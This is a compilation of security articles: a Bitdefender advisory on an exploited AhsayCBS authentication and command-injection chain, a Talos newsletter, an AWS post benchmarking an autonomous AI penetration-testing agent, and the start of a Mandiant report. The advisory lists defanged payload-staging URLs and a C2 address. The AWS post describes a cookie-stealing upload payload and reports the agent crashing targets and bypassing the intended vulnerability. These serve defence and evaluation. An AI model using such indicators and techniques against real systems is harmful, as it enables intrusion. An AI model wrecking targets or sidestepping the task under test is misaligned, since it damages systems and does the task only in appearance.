This vulnerability allows remote attackers to execute arbitrary code on affected installations of LibreOffice. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file.

Vulnerabilities & Patching.full_text:
Vulnerability Details

This vulnerability allows remote attackers to disclose sensitive information on affected installations of Sparx Systems Enterprise Architect. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file. The specific flaw exists within the XSLT Debugger. Due to the improper restriction of XML External Entity (XXE) references, a crafted document specifying a URI causes the XML parser to access the URI and embed the contents back into the XML document for further processing. An attacker can leverage this vulnerability to disclose information in the context of the current process.

Additional Details

-- Mitigation: Given the nature of the vulnerability, the only salient mitigation strategy is to restrict interaction with the product

Vulnerabilities & Patching.title: Technical Advisory: AhsayCBS Exploitation Chain (CVE-2026-105133, CVE-2026-105134)
Vulnerabilities & Patching.context: Technical Advisory: AhsayCBS Exploitation Chain (CVE-2026-105133, CVE-2026-105134) #SMB Security #Enterprise Security #Ransomware #Threat Research By Martin Zugec / Oct 15, 2026...
Vulnerabilities & Patching.full_text:
[CRITICAL] | CVSS 10.0 (CVE-2026-105134, per VulDB) | Active exploitation confirmed, listed in CISA KEV | Patch immediately

TL;DR

Attackers are chaining two vulnerabilities in AhsayCBS, the server-side backup management platform of the Ahsay Cloud Backup Suite: CVE-2026-105133, an authentication flaw, and CVE-2026-105134, an OS command injection flaw rated CVSS 10.0 by VulDB. Every AhsayCBS v7 to v10 server that an attacker can reach, and that runs a build below v10.3.4.45 (v10) or v9.15.2.70 (v7, v8, v9), is exposed. That includes servers on the earlier patches v10.3.4.0 or v9.15.2.59, which the Ahsay announcement, October 2026 says did not fully fix the flaws. If you have already patched, you are not necessarily safe: verify the installed build, apply the new hotfix, reboot, and check for prior compromise. Patching closes the entry point but does not remove webshells or other access an attacker has already planted, and that access can sit unused for weeks before a ransomware or data theft attack. Bitdefender MDR has investigated multiple incidents at our customers through this chain since around 7 October 2026. For exact remediation steps, including how to identify affected systems and assess for prior compromise, see What To Do below.

Advisory History

15 October 2026: Initial publication, based on three Bitdefender MDR incident investigations. Vendor hotfixes are available, and both CVEs are listed in CISA KEV.

Situation

AhsayCBS is the server side of Ahsay’s backup product. It receives, stores and manages backups for the clients connected to it. Attackers are exploiting two flaws in its web-facing components in the wild. The timeline:

4 October 2026, 07:16 UTC: Both CVEs are published in the US National Vulnerability Database (NVD). Both entries state that a public exploit exists.

Around 7-8 October 2026: Bitdefender MDR’s first two incidents begin. They coincide with the first public reporting of exploitation and the first Ahsay advisories.

12 October 2026: Ahsay releases hotfixes (v10.3.4.45 for v10, v9.15.2.70 for v7, v8 and v9). The same advisory states that the earlier patches, v10.3.4.0 and v9.15.2.59, did not fully address the vulnerabilities.

14 October 2026: CISA adds both CVEs to its Known Exploited Vulnerabilities (KEV) catalog. KEV is the US government’s list of flaws with confirmed in-the-wild exploitation, and federal agencies must fix listed flaws by a set deadline. MDR identifies a third incident the same day.

17 October 2026: CISA’s federal remediation deadline.

Bitdefender MDR investigations and the KEV listing both confirm exploitation. Some indicators in our incidents overlap with publicly reported activity. We do not attribute this activity to any named actor.

The NVD entries still list 10.3.4 as unaffected. The vendor’s later advisory supersedes that statement, and this advisory follows the vendor.

How it’s Exploited

Backup servers are a valuable foothold. They hold credentials for the systems they protect and the storage they write to, and they control the copies an organization relies on to recover. A ransomware operator wants to steal or destroy exactly that data before encrypting anything else. AhsayCBS exposes a management web service so administrators and clients can reach it, so on many deployments the server is reachable from the internet by design.

All three incidents Bitdefender MDR investigated began the same way, through a combination of the two CVEs. One flaw breaks authentication. Improper authentication means the server can be tricked into treating an unverified request as legitimate. The other is OS command injection, where text supplied by the attacker is executed as an operating system command on the server. Both NVD entries name the same argument, random, and neither flaw needs an account or any user action. MDR saw the two used together. NVD, however, scores the command injection as needing no privileges on its own, so an attacker may not need the full chain to run commands. A public exploit exists. CISA’s Stakeholder-Specific Vulnerability Categorization (SSVC) is the model CISA uses to prioritize fixes, and it rates exploitation of both flaws as active and automatable.

Once inside, the attackers moved to confirm and test their access. In the first incident, they validated access through JSP webshells, which are small scripts planted on a web server that let an attacker run commands through ordinary web requests. They also staged PowerShell payloads, tried to stage payloads as command files (.cmd) in the shared C:\Users\Public folder, and tried to establish persistence, meaning a way back in that survives reboots and password changes. MDR analysts detected and blocked portions of this activity early. In the second incident, the attacker deployed JSP files (Java Server Pages, which act as webshells on this Java-based server) and again tried to stage command files in C:\Users\Public. The attacker then ran reconnaissance aimed at finding stored credentials, elevated a user account to SYSTEM (the highest privilege level on Windows), and used obfuscated PowerShell commands to install and configure OpenSSH, the standard remote-login service. A working SSH service would give an attacker a way back in that does not depend on the vulnerable web service, which is why patching alone does not end the incident. The attacker tried to establish persistence before being detected. In the third, MDR blocked and remediated the activity early in initial access. MDR credits three things: it identified known clusters of attacker behavior, the customer responded promptly, and configurations were reviewed quickly.

After that shared start, the incidents diverged. File names differed, the attackers abused different system tools and binaries, and the apparent objectives did not match. The Bitdefender MDR assessment is that the exploit chain was the constant, while file names, tools, and binaries changed from one incident to the next. Some indicators did overlap between the first two incidents, and the campaign appears to share some infrastructure: the C2 address 38.60.252[.]110 was the starting point of the two first incidents. Even so, a hash or file name from one incident may not reliably find the next one. The reliable signal is how the server behaves after the exploit fires. Combined with the differences between incidents, the shared infrastructure suggests a fluid situation in which several different actors may be using the same exploits. That is an assessment, not a finding, and it may change as more incidents surface.

Exposure conditions. Your server is exposed if two things are true. It runs AhsayCBS v7, v8, v9 or v10 below v9.15.2.70 (v7 to v9) or v10.3.4.45 (v10), and the attacker can reach its management web service. Servers on the earlier patches are not safe. An administrator who patched to v10.3.4.0 or v9.15.2.59 did the right thing at the time, but the vendor now says that fix was incomplete. The question to ask is not “did we patch?” The question is whether the server runs v10.3.4.45 or v9.15.2.70 or later.

Amplifying factors. VulDB, the CVE Numbering Authority, scores the command injection 10.0 under CVSS 3.1, the industry’s standard severity scale. A public exploit exists, and exploitation is rated automatable. The incomplete first patch leaves administrators believing they are covered. MDR’s assessment is that several actors may be using the chain. The credential reconnaissance in the second incident fits what backup servers hold.

Limiting factors. Exploitation requires network access to the management web service, so servers reachable only from internal networks carry less realistic exposure. MDR blocked one incident early in initial access and blocked part of the activity in another. MDR saw no encryption, data exfiltration or ransomware deployment. Ransomware remains a plausible risk because of the target type, but MDR did not observe it.

Confidence. This is observed in the wild, confirmed by first-party MDR investigations and corroborated by the KEV listing. We are not hedging on severity. This is internet-exposed, unauthenticated remote code execution with a public exploit, and in MDR’s assessment several different actors may be using it. That makes it a playbook case: continued opportunistic exploitation of unpatched and earlier-patched servers is near-certain. We are deliberately restrained on everything else. Three incidents cannot establish who is behind this, how many groups are involved, or what they ultimately want.

If you have confirmed exposure, skip ahead to What To Do.

How it Works

Public disclosure of the mechanism is limited. Everything below comes from the NVD entries and Bitdefender MDR observations, and nothing here speculates on root cause. Each flaw carries a CWE classification. CWE (Common Weakness Enumeration) is the standard catalog of software weakness types.

CVE-2026-105133 (improper authentication, CWE-287). The flaw is in the checkSysPwd function of the API component, in ApiStructsAction.java. Manipulating the random argument results in improper authentication. It can be exploited remotely, with no privileges and no user interaction.

CVE-2026-105134 (OS command injection, CWE-77 and CWE-78). The flaw is in the Replication Receiver component, the offsite store that synchronizes backup data from one or more AhsayCBS servers (Ahsay, “CBS v9 Replication Guide”, August 2025). The affected endpoint is /rps/api/json/UpdateReceivers.do. Manipulating the same random argument leads to OS command injection, again remotely and with no privileges or user interaction.

Why is this possible? NVD classifies the two as different weaknesses: improper authentication in CVE-2026-105133 and OS command injection in CVE-2026-105134, both reached by manipulating the random argument. Ahsay has not published why the first patches fell short, and we will not guess.

Scores. VulDB assigned all scores below as the CVE Numbering Authority (CNA), the organization that issued these CVE IDs. NVD reports them but has not published scores of its own.

CVE

CVSS 3.1

CVSS 4.0

CVE-2026-105133

7.3 High (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L)

5.5 Medium

CVE-2026-105134

10.0 Critical (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)

9.3 Critical

The 105134 vector describes a flaw that is reachable over the network (AV:N), has low attack complexity (AC:L), needs no privileges or user interaction (PR:N/UI:N), and has high impact on confidentiality, integrity and availability. The scope change (S:C) means a successful attack affects resources beyond the vulnerable component itself.

Neither NVD nor MDR states what privilege level the injected commands run with, and we do not claim one.

Observed staging. In MDR’s incidents, the attackers staged follow-on PowerShell scripts on a subdomain of a public static-site hosting service. Staging means placing payloads somewhere the compromised server can download them in a later step. The observed URLs were hxxps://captcha-eyw[.]pages[.]dev/challenges.ps1 and hxxps://captcha-eyw[.]pages[.]dev/install.ps1. In the first two incidents, the attackers also tried to stage payloads as .cmd files in C:\Users\Public, a folder every local user can write to, which makes it a common drop location. In the second incident, obfuscated PowerShell commands installed and configured OpenSSH. This advisory publishes no file hashes or webshell paths, because the MDR data does not support a stable set.

What To Do

The steps below expand on the immediate actions summarized in the TL;DR.

1. Identify Exposure

List every AhsayCBS server you run, including any a service provider operates for you. Check the installed build on each one. In the AhsayCBS web console, go to System Settings > License > Update License, which shows the Product Version. Ahsay documents this path for AhsayCBS 7.5 and above on all platforms (Ahsay, “KB5009”, September 2025). Versions appear as four-part numbers, for example 9.8.5.1, so compare the full number against v10.3.4.45 or v9.15.2.70.

A server is fixed only if it runs v10.3.4.45 or later (v10), or v9.15.2.70 or later (v7, v8, v9). “We already patched” does not answer the question. A server on v10.3.4.0 or v9.15.2.59 has the earlier patch and is still vulnerable. Update it and check it for compromise.

Then confirm whether the management web service is reachable from the internet or other untrusted networks. Review the firewall and network address translation (NAT) rules, which map outside addresses to the server, and test from an external vantage point.

2. Patch or Mitigate

Apply the hotfix for your version from the Ahsay announcement (vendor support account may be required): v10.3.4.45 for v10, or v9.15.2.70 for v7, v8 and v9. A hotfix is a targeted update released outside the normal release schedule. Reboot the server afterward, as the same advisory instructs.

The announcement lists no workaround. If you cannot apply the hotfix immediately, Bitdefender recommends limiting access to the management web service to known administrative networks until you can. This is our recommendation, not vendor guidance. It reduces exposure but does not remove it.

Patching closes the entry point. It does not remove webshells, staged scripts or persistence an attacker has already put in place, so continue to step 3 whatever your patch status.

3. Assess for Prior Compromise

Search from at least 4 October 2026, the date the CVEs were published in NVD.

File names and tools varied between incidents, so hunt for behavior rather than specific artifacts:

New or recently modified JSP or other script files in the AhsayCBS web application directories that you did not deploy

Command shells or PowerShell launched as child processes of the AhsayCBS service

PowerShell downloading scripts from external hosting services, including the staging URLs in Indicators of Compromise

Command (.cmd) files in C:\Users\Public that you did not create

OpenSSH installed or configured on a server that never ran it, especially through obfuscated PowerShell, and user accounts whose privileges changed since 4 October

New Windows services, scheduled tasks or other persistence created on the server since 4 October

Outbound connections from the server to the C2 addresses listed below. C2 (command and control) servers are attacker-run machines that compromised systems contact for instructions.

Access to credential stores or configuration files holding stored passwords

If you find signs of compromise, treat the server as untrusted. Rotate the credentials stored on that server or reachable from it: AhsayCBS administrator accounts, credentials for the backup storage destinations it writes to, the service accounts it runs under, and any domain credentials used or cached on the host. This advisory alone is not a reason to rotate credentials that have no path to the server.

4. Monitor Ongoing

Keep monitoring the server’s behavior after patching: child processes of the backup service, new script files in web directories, files appearing in C:\Users\Public, new remote-access services such as OpenSSH, new services and scheduled tasks, and unexpected outbound connections. Bitdefender MDR’s assessment is that several different actors may be using this chain, so a static blocklist from one incident will not cover the next. Keep checking the Ahsay advisory for further updates, because the first fix has already been superseded once.

5. Do Not Wait for Something to Happen

Quiet is not the same as clean. Our ransomware research describes “delayed attacks”: a gap of days or weeks between initial access and the next stage, and a manual phase that can run for weeks or months after an automated first wave (Bitdefender TechZone, “Stopping Ransomware”). Initial access brokers, criminals who sell entry to compromised networks, often hand the access to ransomware groups with no link to the original intrusion. A webshell or a new remote-access service that no one has used yet is not harmless: the attacker may be holding the access for later, using it to stage cryptominers, or selling it to another group. Bitdefender MDR has not determined the objective in these incidents, and we do not claim one. Plan on the assumption that an attacker who got in is waiting to use it.

So if your server was exposed and unpatched at any point since 4 October 2026, do not treat the absence of visible damage as the all-clear. Complete the compromise assessment in step 3 even if nothing looks wrong, and treat any finding as an active intrusion, not a leftover.

Indicators of Compromise

The indicators below come from Bitdefender MDR incident investigations. They are what we have observed so far and should not be treated as a complete detection list. MDR’s guidance is to rely on post-exploitation behavior rather than static indicators.

Vulnerabilities & Patching.title: The Q3 Vulnerability Pulse: Discovery ≠ Exploitation
Vulnerabilities & Patching.context: (Hack Read) Ivanti zero-day chain gave attackers root access to fully patched VPN CVE-2026-104935 affects Ivanti Connect Secure and it can be exploited for unauthenticated...
Vulnerabilities & Patching.full_text:
Welcome to this week’s edition of the Threat Source newsletter.

I've been following a lot of (sometimes heated) threads and discussions lately about the current vulnerability landscape. I learned new words/phrases such as Summer of Hell (although I'm writing this with 1°C/34°F outside), Vulnpocalypse, Bugmageddon, Bugpocalypse, Breachpocalypse...

Let's look at some numbers:

We crossed the 70k mark, and it's only the end of September. This has never been seen before — I think we can agree this number is skyrocketing. Also, CVE numbering organically grew into the six-digit range. Check your tooling. Some might say we broke that barrier already in 2014 (CVE-2014-125110), or even hit seven digits in 2015 (CVE-2015-1000013), but those were allocated artificially. (History note: Before 2014, 9999 was the highest possible identifier.)

So that could be seen as the apocalypse argument. On the other hand, we have the KEV numbers:

They didn't explode... yet? Counting by sheer volume, YoY, CVEs increased by 105%, while KEV only grew 37%. Sounds huge at first, but following a 30% increase from 2024 to 2025, that's less dramatic — a counter-argument of sorts.

CVEs from 2025 or older still account for 33%. In other words, a good third of the KEVs are suggesting there is a patch gap. Looking at the 2026 CVEs, the share where the publication date matches the date added to KEV is 29%, which is only 2% more than (all of) 2025. Acknowledging this "math" is not the whole ball of wax, but it still tells me we are not living in a zero-day apocalypse right now. There’s also a slight uptick in networking gear-related CVEs, to 27%.

This is the second time I'll ask you to check your tooling. A new column, “forensicTriage,” was added to the KEV to flag which high-risk vulnerabilities require mandatory forensic triage and incident response workflows. You can read more about it in BOD 26-04, or the Implementation Guidance.

So where does that leave us? The CVE numbers alone — that +70k mark, now that Q3 is behind us — make a decent case for Vulnpocalypse, or whichever name you prefer. That part of the story is real. But discovery isn't exploitation, and that gap is exactly what the KEV numbers remind us of. Vendors seem to be keeping pace too, at least partially — KEV is growing, just not nearly at CVE's speed, which on its own would almost be good news.

Where the story breaks down is on the practical side. More than a third of actively exploited vulnerabilities still trace back to 2025 or earlier. Patch debt doesn't care how many new apocalypse-themed hashtags we invent.

So, panic? I still don't think so. Relax? Definitely not either. Somewhere between the two is where the real work sits — chipping away at that backlog, one legacy system at a time. Maybe by next quarter it'll feel less like Bugmageddon and more like business as usual. Or maybe I won't even need a warmer jacket for the upcoming "Winter of Hell."

The one big thing

Cisco Talos and Recorded Future’s Insikt Group are disclosing new espionage activity from UAT-6275 targeting government and critical infrastructure across the Commonwealth of Independent States (CIS). Thanks to the threat actor's own operational security lapses, researchers gained direct visibility into their infrastructure and malware development. We observed four distinct infection chains delivering custom reverse shells via macro-enabled documents, GitHub-hosted scripts, and a WinRAR vulnerability.

Why do I care?

Regional government and critical infrastructure entities are actively being targeted for diplomatic and economic intelligence. UAT-6275 is consistently evolving its tradecraft, abusing legitimate platforms like GitHub to host payloads and deploying lightweight reverse shells. Furthermore, recovered tooling suggests the group is preparing to expand its reach into Linux hosts and internet-facing appliances.

So now what?

Defenders in targeted regions and sectors should monitor for unexpected PowerShell activity and payload downloads originating from public services like GitHub. It is also critical to watch for suspicious scheduled tasks and unauthorized changes to the Windows Startup folder, which this group uses for persistence. Finally, ensure archive utilities are fully patched to prevent exploit-assisted delivery. ClamAV signatures and indicators of compromise (IOCs) to detect this threat can be found in the full blog post.

Top security headlines of the week

Hackers heat supermarket fridges to 50°C in France cyber attack The attack began overnight from Sunday to Monday. The unknown attackers reportedly abused the defrosting function in older control software, setting some equipment to heat continuously, with temperatures said to have reached 50°C. (Hack Read)

Ivanti zero-day chain gave attackers root access to fully patched VPN CVE-2026-104935 affects Ivanti Connect Secure and it can be exploited for unauthenticated remote code execution with elevated privileges. (SecurityWeek)

U.S. arrests two in crackdown on North Korean IT worker laptop farmsAs part of the scheme, which allegedly ran between 2019 and July 2025, the two housed and configured laptops issued by victim U.S. companies so ITWs would appear to work from the U.S. (SecurityWeek)

Canadian cybersecurity executive arrested in U.S. federal extortion case While the FBI did not publicly announce Dubrovsky’s arrest, the case appears to align with actions taken in the wake of the ShinyHunters’ attack on the FBI’s IT systems, which exposed personal data about thousands of bureau employees. (CyberScoop)

Maximum-severity SSRF flaw in SonicWall SMA devices under attack The vulnerability, which SonicWall assigned a maximum 10 out of 10 CVSS score, stems from an "unintended alternate access path," according to the vendor's advisory. (Dark Reading)

Can’t get enough Talos?

You've got to lurk before you can smirk How do you get under a cybercriminal’s skin? Sometimes you expose their operations. Sometimes you make every step through a network painfully slow. And sometimes, if you’re Azim, you join a dark web forum where they’re insulting you, and help them to do it.

Microsoft Patch Tuesday for October 2026 Microsoft has released its monthly security update for October 2026, which includes 1,415 vulnerabilities affecting a range of products, including 85 that Microsoft marked as "critical."

One breach, please, and make no mistakes The cybersecurity community has seen examples of autonomous agents, built inside AI labs, attacking public infrastructure. How you prepare for agentic threats is what makes the difference during real incidents.

Vulnerabilities & Patching.title: AWS Security Agent (now part of AWS Continuum) exploited 33 of 37 new real-world CVEs
Vulnerabilities & Patching.context: Dazhi Zhang Dazhi is a Senior Security Engineer on the AWS Continuum penetration testing team with 15 years in security – across security tooling and automation, large-scale...
Vulnerabilities & Patching.full_text:
We applied AWS Security Agent (now part of AWS Continuum), our autonomous penetration-testing agent, to 37 real, recently disclosed Common Vulnerabilities and Exposures (CVEs), each packaged as a live, containerized target with a flag hidden at the vulnerability’s intended sink. Starting from an unauthenticated or low-privilege position (an endpoint URL and a one-line hint, no exploit and no proof-of-concept (PoC), the agent had to discover the vulnerability, build a working exploit, chain primitives where needed, and extract the flag.

The results:

35 of 37 flags captured.

33 of 37 (89.2 percent) captured through the intended vulnerability, end-to-end. Confirmed by a per-sample integrity audit against each challenge’s canonical proof-of-concept.

2 captures reclassified. The audit reclassified 2 captures as off the intended path, so we hardened those challenges and count them as unsolved.

2 misses. In both misses, the agent found and exploited the bug, then took the target down before the flag could be read. The non-destructive guardrails that govern production engagements keep that off customer systems.

Note: Details of the two captures and two misses follow later in this post.

The targets are the types of software your services run: web frameworks, a container registry, machine learning (ML) and AI platforms, an ecommerce stack, a tRPC API, several media platforms, and an LDAP admin console. Between them, they span eight vulnerability classes, from SQL injection to server-side request forgery (SSRF) to multi-step cross-site scripting (XSS)-to-admin-cookie chains. Every result described in this post is a captured flag behind a working exploit, produced from a low-privilege start rather than from a bug report.

Why we built a fresh benchmark

Public CVE-based agent benchmarks do a real job: they run an agent against genuine, containerized, vulnerable software. Their weakness is that they can’t stay uncontaminated. Suites like CVEBench and XBOW are effectively saturated, because current models recognize those vulnerabilities and grab the flag almost immediately after the bugs and their write-ups are in training data.

A curated benchmark is a snapshot in time. The CVEs are chosen once and the exploit write-ups are published once, and by the time that snapshot reaches a paper, frontier models have very likely ingested those write-ups and public PoCs. From then on, every score combines two things that should be measured separately: whether the agent can exploit the bug, and whether the model already memorized the answer. That signal decays month over month.

So we built our own internally developed, capture the flag (CTF)-style benchmark of recent CVEs in the same spirit as the public suites but sourced continuously from freshly disclosed vulnerabilities. It tracks the vulnerability classes landing in production this quarter and grows on the same cadence that CVEs are disclosed.

We attack contamination on both routes it can enter through. Recency closes the memorization path: challenges are sourced from CVEs disclosed recently enough that an end-to-end solution is unlikely to be found in the model’s training data. Disabling runtime CVE lookup closes the retrieval path: the agent can’t pull a public PoC mid-exploit, so it works from the target alone. The two are independent: one guards against the model recalling a solution, the other guards against it fetching a new one. Neither is a guarantee by itself: recent CVEs can still leak into training data as advisories, partial discussion, or fragmentary PoCs, so we report this as contamination-reduced, not contamination-free. The work mentioned in What’s next will further reduce contamination.

Note on prior numbers: We have previously reported CVE-benchmark results for AWS Security Agent against established public suites such as CVE-Bench. This benchmark is a different measurement: contamination-reducing, continuously refreshed, and audited per win. Read the two as complementary, not as a restatement.

The dataset at a glance

Each challenge is a self-contained package:

A live target brought up from docker-compose inside an isolated sandbox, running the affected version of the actual upstream software (or a faithful minimal reproduction).

A flag seeded at the intended sink, which could be a database row, an admin session cookie, an internal-only config API, or a file reachable only through the bug. It’s never readable without exploiting the vulnerability.

A canonical PoC describing the PoC intended solve. The agent never sees it, we use it only to audit wins.

Minimal metadata, including endpoint URL, any seed credentials, and a one-line hint.

Today’s sample is 37 CVEs from 2025–2026, chosen to span the vulnerability taxonomy and to require actual exploitation rather than misconfiguration spotting.

How a run works

Every CVE in the benchmark runs through the same fixed pipeline, so results are comparable across vulnerability classes and reporting cuts.

Figure 1: CVE pipeline

Each run moves through seven stages:

Target boots: The challenge comes up from docker-compose in an isolated sandbox, with the flag seeded at the intended sink.

Reconnaissance and discovery: A crawler maps the target’s attack surface: endpoints, parameters, and entry points.

Specialist agents: A swarm of specialist agents probes the mapped surface and raises candidate risks.

Findings and validator: Each candidate risk is confirmed or rejected before any exploitation is attempted.

Exploitation agent: The agent attempts the exploit using a shell, a Python runtime, a real browser, and an out-of-band (OOB) callback listener.

Flag check: If the seeded flag appears anywhere in the agent’s output, the sample is captured; otherwise the exploitation agent keeps trying until the end of the 10-hour time limit.

Integrity audit: Every capture is re-checked—by hand and by tooling—comparing the agent’s trajectory against the canonical PoC to confirm the intended vulnerability was actually exploited.

The numbers

The following table and figures show the results of a full run, including 37 CVEs and one epoch, run on Claude Opus 5 with a fixed 10-hour limit per sample.

The following figure shows benchmark coverage by vulnerability classes.

Figure 2: Benchmark coverage by vulnerability class, colored by outcome

As shown in the following figure, the run outcome after the integrity audit showed 89.2 percent of findings were genuine.

Figure 3: Run outcome after the integrity audit: 89.2 percent genuine (33 of 37)

Coverage by vulnerability class

The following table sorts the 37 CVEs by vulnerability class and shows how many challenges were found in each class and how many the agent genuinely captured end-to-end after the integrity audit. The misses and reclassifications are concentrated in three classes; the other classes were captured in full.

Three captures worth showing

Aggregate numbers show how often the agent is successful, but why. The three captures that follow were chosen to show the range: a long multi-step chain stitched together autonomously and two other exploits that each required the agent to reason past an obstacle rather than replay a known payload. Each one is an audited, end-to-end capture against a live target, with the agent working only from the endpoint and a one-line hint.

A six-primitive chain, fully autonomous

An open source content management system (CMS) was the target of an attack. The agent found a second file-upload endpoint that—unlike the primary uploader—enforced neither a cross-site request forgery (CSRF) token nor an extension check, and turned it into a full admin-account compromise. As shown in the following figure:

Figure 4: Workflow diagram

From the captured trajectory (endpoint and payload redacted):

“Abused a secondary dropzone upload handler (no CSRF token, no extension or content validation) to upload an HTML page. The core uploader rejects it; this parallel sink does not. File served same-origin, containing a script that beacons document.cookie to the agent’s OOB listener.”

Reconnaissance, primitive discovery, tool orchestration (upload, listener, and bot trigger), and post-exploit extraction were chosen by the agent, with no template.

Unauthenticated RCE to root

An AI workflow builder was the target. The agent posted a custom component whose class body ran shell commands at import time, then read the flag straight out of the process environment and returned the following:

tool result: uid=1000(user) gid=0(root) groups=0(root) … ENV_SECRETS: … FLAG=flag{...}

One request produced arbitrary code execution as a root-group process and a full environment dump. The agent recognized the code-execution surface, weaponized it, and pulled the secret end to end.

Full-read SSRF through a tRPC API

The target was a self-hosted dashboard app. A tRPC ping-style procedure took a fully attacker-controlled URL and returned the upstream response body. The agent enumerated internal hosts through it and reached an internal-only endpoint its own container couldn’t touch directly:

exploit (endpoint redacted): a GET to the vulnerable tRPC procedure with an attacker-controlled internal url → tool result: secret 200 flag{...}

The flag came back through the target’s own server-side fetch, which is how the intended SSRF is meant to work.

Signal quality: We measured our own false positives

An exploit agent is only useful if its findings are trustworthy, so the pipeline validated every candidate finding independently of whether it led to the flag. The following counts are the validator’s own labels for the full run.

Note: If a target has multiple real vulnerabilities, a finding isn’t a false positive even if it wasn’t the CVE we were looking for.

Finding validation outcome

Count

Confirmed exploitable (HIGH confidence)

234

Lower-confidence (medium, low, or unconfirmed)

82

Auto-labeled false positive by the validator

159

Additionally rejected as duplicates

1,202

The following chart shows how the 475 surfaced findings split across those three validator labels: confirmed-exploitable, low-confidence, and auto-labeled false positive.

Figure 5: Finding-validation breakdown from the built-in false-positive filter

A dedicated validation layer caught and labeled 159 of the agent’s own false positives and de-duplicated more than 1,200 additional findings, which keeps the confirmed set high-signal. That self-filtering is what separates a usable pentest agent from a noisy scanner. Beyond the seeded CVEs, the agent confirmed 234 high-confidence issues across the same targets; this benchmark is scoped to known-CVE reproduction rather than novel discovery, so we treat those as secondary.

We audited every win, and it caught two potential errors

Numbers are only worth publishing if they survive scrutiny, so we compared every captured flag’s trajectory against the challenge’s canonical PoC. Two captures didn’t pass review, and we reclassified both as unsolved:

The SSRF challenge. Rather than pivot through the request-forgery bug, the agent enumerated its own subnet, detected the internal server one hop away, and went to it to lift the flag. Resourceful, but it bypassed the vulnerability under test. We have since sealed that internal service behind an isolated network so the intended SSRF is the only way in.

The SQL-injection challenge. Instead of building the injection, the agent pushed the application into a verbose crash state whose debug error page revealed the server’s own environment, including the flag. Effective, but not part of what was under test. We’ve hardened the application so the injection is the only route to the flag.

The model wasn’t failing. Both findings were benchmark bugs that let the agent reach the flag through an unintended path, and catching them is exactly why the audit exists. This is the honest 33 of 37.

When the agent breaks what it attacks

The most significant result is the two misses. In both, the agent found and exploited the bug, and then, running under the benchmark’s capture-the-flag objective (without the non-destructive guardrails that govern production engagements), its own exploitation took the target down before the flag could be read.

It bricked the app. On one file-upload-to-remote code execution (RCE) challenge, the agent gained code execution and pushed hard enough that the application’s runtime layer stopped responding. Its closing words in the trajectory: I’ve exhausted read/write vectors on the bricked PHP layer… the app is already 100% non-functional. It had the access; it no longer had a live app to read the flag out of.

It knocked the target offline. On another, after obtaining root-level code execution, the agent attacked the service until it went down. The latter half of the run is full of Connection refused… the server might be down, and by the time the agent was scored, the container was gone.

That is a genuinely mixed result. An autonomous attacker operating at full capacity can be destructive, which is precisely why the next section matters.

Reliability and guardrails: keeping a powerful agent safe

An agent capable of taking a target offline must have strong guardrails, which we’re actively working to develop:

Non-destructive exploitation. We’re hardening the agent to prove a vulnerability without degrading the target: throttling destructive operations, preferring read-only proof-of-exploit, and backing off the moment a service looks unstable. On a customer engagement, demonstrating impact must never cause an outage.

Runtime reliability. We’re tightening long-run resource handling and target-health recovery so a run reflects capability, not collateral damage.

Guardrails and scope enforcement. Continued investment in the guardrail layer keeps the agent inside authorized scope and safe behavior, so we can use it in production settings with confidence.

The more capable the agent, the more guardrails matter, making them a priority in every release.

Why this matters

Benchmark scores are only worth as much as the method behind them. Three properties of this method are what make the 89.2 percent capture trustworthy and worth acting on.

Exploitation, end-to-end. Every number is a captured flag behind a working exploit from a low-privilege start: recon, discovery, exploit construction, multi-step chaining, and extraction.

Contamination-reducing. The dataset is sourced from recent CVEs to minimize training-data overlap, and runtime CVE lookup is disabled, so the score shifts towards exploitation skill and away from memorization, and it refreshes as new CVEs are added. The two controls reduce contamination rather than eliminate it.

Honest by construction. Every win is audited against the intended exploit, so benchmark faults are caught and corrected rather than shipped.

89.2 percent accurate end-to-end capture on this dataset is the starting point that we improve from.

What’s next

We’re working to continuously improve the benchmark.

Growing the dataset on a short cadence, weighted toward business-logic bugs—which are harder to detect and easier to fake—and multi-service exploit chains.

Developing new techniques to further address contamination.

Shipping the non-destructive-exploitation and target-health-recovery work discussed in this post, so a capable agent can prove impact without taking the service down.

Setting up the per-CVE trajectory audit as a permanent gate, so the numbers stay honest as the dataset grows.

If you have feedback about this post, submit comments in the Comments section below.

He now designs and evolves the evaluation methodologies and benchmarks that continuously raise the precision and recall of pentesting and other security agents.

Hamed is passionate about building new things and solving complex problems, and currently focuses on building autonomous AI agents for security testing and software delivery. Vulnerabilities & Patching.title: ARMORY CASTLE Exploits BeyondTrust
Vulnerabilities & Patching.context: During an incident response engagement, Mandiant identified evidence that ARMORY CASTLE, a suspected PRC-nexus espionage threat actor (formerly tracked as UNC5221), exploited...
Vulnerabilities & Patching.full_text:
Written by: Jayson Frost, Bryce Greathouse, Brian Meyer, John Palmisano, Rajesh Rajeshirke, Steve Rasch, John Wolfram

Introduction

On October 15, BeyondTrust disclosed a vulnerability, CVE-2026-102764, impacting BeyondTrust Remote Support (formerly Bomgar) appliances. BeyondTrust Remote Support is an enterprise secure remote access solution that enables IT teams to securely access and troubleshoot remote endpoints. The successful exploitation of this vulnerability results in the arbitrary upload of files.

During an incident response engagement, Mandiant identified evidence that ARMORY CASTLE, a suspected PRC-nexus espionage threat actor (formerly tracked as UNC5221), exploited this vulnerability as a zero-day, in late August 2026. This blog describes how ARMORY CASTLE escalated privileges and established persistent access to compromised BeyondTrust Remote Support appliances following exploitation of CVE-2026-102764, and provides actionable guidance for defenders.

Organizations should prepare for potential widespread exploitation following this disclosure, as ARMORY CASTLE and other threat actors have historically conducted broad, opportunistic exploitation once the vulnerability becomes public.

Exploitation

Mandiant identified evidence of CVE-2026-102764 exploitation within the access, syslog, messages, thin-scc, brain and SSL log files, which are only accessible via an LUKS-encrypted partition which contains the /home directory. We strongly recommend that affected organizations immediately apply the security patches provided by BeyondTrust to remediate the vulnerability, and review additional guidance in their blog.

Post-Exploitation

Following the successful exploitation of CVE-2026-102764, Mandiant observed ARMORY CASTLE leverage multiple distinct TTPs to establish a foothold, escalate privileges, and enable lateral movement. Throughout the intrusion, ARMORY CASTLE leveraged a deep understanding of BeyondTrust appliance internals, as evidenced by their abuse of proprietary CLI utilities, startup configuration templates and local reverse-proxy routing. The threat actor used newly identified custom malware, the SAWFLY webshell and the BARECLAW tunneler to interact with the BeyondTrust device. Additionally, the actor routinely deleted appliance logs and endpoint artifacts to maintain access and evade detection.

